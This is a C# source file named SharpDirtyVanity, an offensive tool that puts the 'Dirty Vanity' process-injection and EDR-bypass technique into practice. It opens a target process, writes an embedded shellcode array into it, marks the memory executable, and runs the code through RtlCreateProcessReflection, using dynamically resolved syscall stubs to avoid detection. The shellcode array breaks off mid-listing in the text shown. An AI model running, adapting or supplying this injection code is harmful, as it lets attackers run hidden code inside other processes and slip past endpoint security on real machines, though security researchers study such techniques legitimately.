using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;
using static DInvoke.DynamicInvoke.Generic;

namespace SharpDirtyVanity
{
    class Delegates
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NTSTATUS NtOpenProcess(
            ref IntPtr ProcessHandle,
            DI.Data.Win32.Kernel32.ProcessAccessFlags DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            ref uint OldProtect);

        // https://docs.rs/ntapi/0.3.4/ntapi/ntrtl/type.RtlCreateProcessReflection.html
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NTSTATUS RtlCreateProcessReflection(
            IntPtr ProcessHandle,
            uint Flags,
            IntPtr StartRoutine,
            IntPtr StartContext,
            IntPtr EventHandle,
            ref Native.RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION ReflectionInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NTSTATUS NtClose(IntPtr ObjectHandle);
    }

    class Native
    {
        public const uint RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED = 0x00000001;
        public const uint RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES = 0x00000002;
        public const uint RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE = 0x00000004;

        [StructLayout(LayoutKind.Sequential)]
        public struct RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION
        {
            public IntPtr ReflectionProcessHandle;
            public IntPtr ReflectionThreadHandle;
            public CLIENT_ID ReflectionClientId;
        }
    }

    class DynamicInvoke
    {
        public static NTSTATUS NtOpenProcess(
            ref IntPtr ProcessHandle,
            DI.Data.Win32.Kernel32.ProcessAccessFlags DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId)
        {
            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("ZwOpenProcess");
            Delegates.NtOpenProcess ntOpenProcess = (Delegates.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(
                stub, typeof(Delegates.NtOpenProcess));

            return ntOpenProcess(
                ref ProcessHandle,
                DesiredAccess,
                ref ObjectAttributes,
                ref ClientId);
        }

        public static NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect)
        {
            IntPtr stub = GetSyscallStub("ZwAllocateVirtualMemory");
            Delegates.NtAllocateVirtualMemory ntAllocateVirtualMemory = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(
                stub, typeof(Delegates.NtAllocateVirtualMemory));

            if (ProcessHandle == IntPtr.Zero)
                return ntAllocateVirtualMemory(
                    Process.GetCurrentProcess().Handle,
                    ref BaseAddress,
                    ZeroBits,
                    ref RegionSize,
                    AllocationType,
                    Protect);

            return ntAllocateVirtualMemory(
                ProcessHandle,
                ref BaseAddress,
                ZeroBits,
                ref RegionSize,
                AllocationType,
                Protect);
        }

        public static NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten)
        {
            IntPtr stub = GetSyscallStub("ZwWriteVirtualMemory");
            Delegates.NtWriteVirtualMemory ntWriteVirtualMemory = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(
                stub, typeof(Delegates.NtWriteVirtualMemory));

            return ntWriteVirtualMemory(
                ProcessHandle,
                BaseAddress,
                Buffer,
                BufferLength,
                ref BytesWritten);
        }

        public static NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            ref uint OldProtect)
        {
            IntPtr stub = GetSyscallStub("ZwProtectVirtualMemory");
            Delegates.NtProtectVirtualMemory ntProtectVirtualMemory = (Delegates.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(
                stub, typeof(Delegates.NtProtectVirtualMemory));

            if (ProcessHandle == IntPtr.Zero)
                return ntProtectVirtualMemory(
                    Process.GetCurrentProcess().Handle,
                    ref BaseAddress,
                    ref RegionSize,
                    NewProtect,
                    ref OldProtect);

            return ntProtectVirtualMemory(
                ProcessHandle,
                ref BaseAddress,
                ref RegionSize,
                NewProtect,
                ref OldProtect);
        }

        public static NTSTATUS NtClose(IntPtr ObjectHandle)
        {
            IntPtr stub = GetSyscallStub("ZwClose");
            Delegates.NtClose ntClose = (Delegates.NtClose)Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtClose));

            return ntClose(ObjectHandle);
        }

        public static NTSTATUS RtlCreateProcessReflection(
            IntPtr processHandle,
            uint flags,
            IntPtr startRoutine,
            IntPtr startContext,
            IntPtr eventHandle,
            ref Native.RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION reflectionInformation)
        {
            object[] parameters = { processHandle, flags, startRoutine, startContext, eventHandle, reflectionInformation };
            var result = (NTSTATUS)DynamicAPIInvoke("ntdll.dll", "RtlCreateProcessReflection",
                typeof(Delegates.RtlCreateProcessReflection), ref parameters);

            reflectionInformation = (Native.RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION)parameters[5];

            return result;
        }
    }

    /// <summary>
    /// Based on:
    /// https://www.blackhat.com/eu-22/briefings/schedule/index.html#dirty-vanity-a-new-approach-to-code-injection--edr-bypass-28417
    /// https://i.blackhat.com/EU-22/Thursday-Briefings/EU-22-Nissan-DirtyVanity.pdf
    /// https://github.com/deepinstinct/Dirty-Vanity
    /// </summary>
    class Program
    {
        public static void Main(string[] args)
        {
            var processId = int.Parse(args[0]);

            #region NtOpenProcess

            IntPtr hProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            CLIENT_ID ci = new CLIENT_ID { UniqueProcess = (IntPtr)processId };

            var ntstatus = DynamicInvoke.NtOpenProcess(
                ref hProcess,
                DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_VM_OPERATION |
                    DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_VM_WRITE |
                    DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_CREATE_THREAD |
                    DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_DUP_HANDLE,
                ref oa,
                ref ci);

            if (ntstatus != NTSTATUS.Success)
                throw new Exception($"[-] NtOpenProcess: {ntstatus}");

            #endregion

            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            ntstatus = DynamicInvoke.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus != NTSTATUS.Success)
                throw new Exception($"[-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = DynamicInvoke.NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus != NTSTATUS.Success)
                throw new Exception($"[-] NtWriteVirtualMemory, shellcode: {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            uint oldProtect = 0;

            ntstatus = DynamicInvoke.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus != NTSTATUS.Success)
                throw new Exception($"[-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region RtlCreateProcessReflection

            var pri = new Native.RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION();

            ntstatus = DynamicInvoke.RtlCreateProcessReflection(
                hProcess,
                Native.RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | Native.RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
                baseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                ref pri);

            if (ntstatus != NTSTATUS.Success)
                throw new Exception($"[-] RtlCreateProcessReflection: {ntstatus}");

            #endregion

            DynamicInvoke.NtClose(hProcess);
        }

        // https://github.com/deepinstinct/Dirty-Vanity/blob/main/NtCreateUserProcessShellcode.txt
        static byte[] shellcode = new byte[3378] {
        0x40, 0x55, 0x57, 0x48, 0x81, 0xEC, 0xB8, 0x03, 0x00, 0x00,
        0x48, 0x8D, 0x6C, 0x24, 0x60, 0x65, 0x48, 0x8B, 0x04, 0x25,
        0x60, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0x00, 0x48, 0x8B,
        0x45, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x45, 0x08,
        0x48, 0x8B, 0x45, 0x08, 0xC6, 0x40, 0x48, 0x00, 0x48, 0x8B,
        0x45, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x83, 0xC0, 0x20,
        0x48, 0x89, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85,
        0x30, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x85,
        0x38, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x6B, 0x00, 0x65, 0x00,
        0x72, 0x00, 0x6E, 0x00, 0x48, 0x89, 0x45, 0x38, 0x48, 0xB8,
        0x65, 0x00, 0x6C, 0x00, 0x33, 0x00, 0x32, 0x00, 0x48, 0x89,
        0x45, 0x40, 0x48, 0xB8, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00,
        0x6C, 0x00, 0x48, 0x89, 0x45, 0x48, 0x48, 0xC7, 0x45, 0x50,
        0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x50, 0x01, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x30, 0x01,
        0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0x38, 0x01,
        0x00, 0x00, 0x48, 0x8B, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48,
        0x83, 0xE8, 0x10, 0x48, 0x89, 0x85, 0x58, 0x01, 0x00, 0x00,
        0xC7, 0x85, 0x60, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0x8B, 0x85, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40,
        0x60, 0x48, 0x89, 0x85, 0x48, 0x01, 0x00, 0x00, 0x48, 0x8D,
        0x45, 0x38, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00, 0xC7,
        0x85, 0x60, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48,
        0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x85,
        0xC0, 0x75, 0x0F, 0xC7, 0x85, 0x60, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0xE9, 0x2E, 0x01, 0x00, 0x00, 0x48, 0x8B,
        0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88, 0x85,
        0x64, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00,
        0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00, 0x00, 0x7E,
        0x13, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB7,
        0x00, 0x66, 0x89, 0x85, 0x68, 0x01, 0x00, 0x00, 0xEB, 0x46,
        0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x41,
        0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83,
        0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00,
        0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x65, 0x01, 0x00, 0x00,
        0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x64, 0x01, 0x00, 0x00, 0x88,
        0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE, 0x85, 0x65,
        0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x68, 0x01, 0x00, 0x00,
        0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00,
        0x88, 0x85, 0x64, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x40,
        0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00,
        0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00,
        0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x6C, 0x01, 0x00, 0x00,
        0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83,
        0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00,
        0x00, 0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x64,
        0x01, 0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x65, 0x01,
        0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x64, 0x01, 0x00,
        0x00, 0x88, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE,
        0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x6C, 0x01,
        0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x48,
        0x83, 0xC0, 0x02, 0x48, 0x89, 0x85, 0x48, 0x01, 0x00, 0x00,
        0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x48, 0x83, 0xC0,
        0x02, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB7,
        0x85, 0x68, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x8D, 0x6C, 0x01,
        0x00, 0x00, 0x3B, 0xC1, 0x0F, 0x84, 0xB5, 0xFE, 0xFF, 0xFF,
        0x83, 0xBD, 0x60, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x2E,
        0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00,
        0x48, 0x83, 0xE8, 0x02, 0x48, 0x89, 0x85, 0x48, 0x01, 0x00,
        0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x48, 0x83,
        0xE8, 0x02, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00, 0x48,
        0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88,
        0x85, 0x64, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01,
        0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00, 0x00,
        0x7E, 0x13, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F,
        0xB7, 0x00, 0x66, 0x89, 0x85, 0x68, 0x01, 0x00, 0x00, 0xEB,
        0x46, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83, 0xF8,
        0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00,
        0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x64, 0x01,
        0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x65, 0x01, 0x00,
        0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x64, 0x01, 0x00, 0x00,
        0x88, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE, 0x85,
        0x65, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x68, 0x01, 0x00,
        0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB6,
        0x00, 0x88, 0x85, 0x64, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85,
        0x40, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00,
        0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00,
        0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x6C, 0x01, 0x00,
        0x00, 0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00,
        0x83, 0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x64, 0x01,
        0x00, 0x00, 0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85,
        0x64, 0x01, 0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x65,
        0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x64, 0x01,
        0x00, 0x00, 0x88, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x0F,
        0xBE, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x6C,
        0x01, 0x00, 0x00, 0x0F, 0xB7, 0x85, 0x68, 0x01, 0x00, 0x00,
        0x0F, 0xB7, 0x8D, 0x6C, 0x01, 0x00, 0x00, 0x2B, 0xC1, 0x89,
        0x85, 0x60, 0x01, 0x00, 0x00, 0x83, 0xBD, 0x60, 0x01, 0x00,
        0x00, 0x00, 0x75, 0x10, 0x48, 0x8B, 0x85, 0x58, 0x01, 0x00,
        0x00, 0x48, 0x89, 0x85, 0x50, 0x01, 0x00, 0x00, 0xEB, 0x25,
        0x48, 0x8B, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x00,
        0x48, 0x89, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85,
        0x30, 0x01, 0x00, 0x00, 0x48, 0x39, 0x85, 0x38, 0x01, 0x00,
        0x00, 0x0F, 0x85, 0xF9, 0xFC, 0xFF, 0xFF, 0x48, 0x8B, 0x85,
        0x50, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0x70, 0x01, 0x00,
        0x00, 0x48, 0xB8, 0x6E, 0x00, 0x74, 0x00, 0x64, 0x00, 0x6C,
        0x00, 0x48, 0x89, 0x45, 0x38, 0x48, 0xB8, 0x6C, 0x00, 0x2E,
        0x00, 0x64, 0x00, 0x6C, 0x00, 0x48, 0x89, 0x45, 0x40, 0x48,
        0xC7, 0x45, 0x48, 0x6C, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x45,
        0x50, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x78, 0x01,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x30,
        0x01, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0x38,
        0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x38, 0x01, 0x00, 0x00,
        0x48, 0x83, 0xE8, 0x10, 0x48, 0x89, 0x85, 0x80, 0x01, 0x00,
        0x00, 0xC7, 0x85, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x48, 0x8B, 0x85, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8B,
        0x40, 0x60, 0x48, 0x89, 0x85, 0x48, 0x01, 0x00, 0x00, 0x48,
        0x8D, 0x45, 0x38, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00,
        0xC7, 0x85, 0x88, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00,
        0x85, 0xC0, 0x75, 0x0F, 0xC7, 0x85, 0x88, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0xE9, 0x2E, 0x01, 0x00, 0x00, 0x48,
        0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88,
        0x85, 0x8C, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01,
        0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00, 0x00,
        0x7E, 0x13, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F,
        0xB7, 0x00, 0x66, 0x89, 0x85, 0x90, 0x01, 0x00, 0x00, 0xEB,
        0x46, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xF8,
        0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00,
        0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x8C, 0x01,
        0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x8D, 0x01, 0x00,
        0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x8C, 0x01, 0x00, 0x00,
        0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE, 0x85,
        0x8D, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x90, 0x01, 0x00,
        0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB6,
        0x00, 0x88, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85,
        0x40, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00,
        0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00,
        0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x94, 0x01, 0x00,
        0x00, 0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00,
        0x83, 0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x8C, 0x01,
        0x00, 0x00, 0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85,
        0x8C, 0x01, 0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x8D,
        0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x8C, 0x01,
        0x00, 0x00, 0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x0F,
        0xBE, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x94,
        0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00,
        0x48, 0x83, 0xC0, 0x02, 0x48, 0x89, 0x85, 0x48, 0x01, 0x00,
        0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x48, 0x83,
        0xC0, 0x02, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F,
        0xB7, 0x85, 0x90, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x8D, 0x94,
        0x01, 0x00, 0x00, 0x3B, 0xC1, 0x0F, 0x84, 0xB5, 0xFE, 0xFF,
        0xFF, 0x83, 0xBD, 0x88, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x84,
        0x2E, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00,
        0x00, 0x48, 0x83, 0xE8, 0x02, 0x48, 0x89, 0x85, 0x48, 0x01,
        0x00, 0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x48,
        0x83, 0xE8, 0x02, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00,
        0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00,
        0x88, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48,
        0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00,
        0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00,
        0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x90, 0x01, 0x00, 0x00,
        0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83,
        0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00,
        0x00, 0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x8C,
        0x01, 0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x8D, 0x01,
        0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x8C, 0x01, 0x00,
        0x00, 0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE,
        0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x90, 0x01,
        0x00, 0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F,
        0xB6, 0x00, 0x88, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x48, 0x8B,
        0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF,
        0x00, 0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x40, 0x01,
        0x00, 0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x94, 0x01,
        0x00, 0x00, 0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00,
        0x00, 0x83, 0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x8C,
        0x01, 0x00, 0x00, 0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE,
        0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85,
        0x8D, 0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x8C,
        0x01, 0x00, 0x00, 0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66,
        0x0F, 0xBE, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85,
        0x94, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x85, 0x90, 0x01, 0x00,
        0x00, 0x0F, 0xB7, 0x8D, 0x94, 0x01, 0x00, 0x00, 0x2B, 0xC1,
        0x89, 0x85, 0x88, 0x01, 0x00, 0x00, 0x83, 0xBD, 0x88, 0x01,
        0x00, 0x00, 0x00, 0x75, 0x10, 0x48, 0x8B, 0x85, 0x80, 0x01,
        0x00, 0x00, 0x48, 0x89, 0x85, 0x78, 0x01, 0x00, 0x00, 0xEB,
        0x25, 0x48, 0x8B, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B,
        0x00, 0x48, 0x89, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B,
        0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x39, 0x85, 0x38, 0x01,
        0x00, 0x00, 0x0F, 0x85, 0xF9, 0xFC, 0xFF, 0xFF, 0x48, 0x8B,
        0x85, 0x50, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x30, 0x48,
        0x89, 0x85, 0x98, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x98,
        0x01, 0x00, 0x00, 0x48, 0x63, 0x40, 0x3C, 0x48, 0x8B, 0x8D,
        0x98, 0x01, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
        0x48, 0x89, 0x85, 0xA0, 0x01, 0x00, 0x00, 0xB8, 0x08, 0x00,
        0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x8D, 0xA0,
        0x01, 0x00, 0x00, 0x8B, 0x84, 0x01, 0x88, 0x00, 0x00, 0x00,
        0x48, 0x8B, 0x8D, 0x98, 0x01, 0x00, 0x00, 0x48, 0x03, 0xC8,
        0x48, 0x8B, 0xC1, 0x48, 0x89, 0x85, 0xA8, 0x01, 0x00, 0x00,
        0x48, 0x8B, 0x85, 0xA8, 0x01, 0x00, 0x00, 0x8B, 0x40, 0x20,
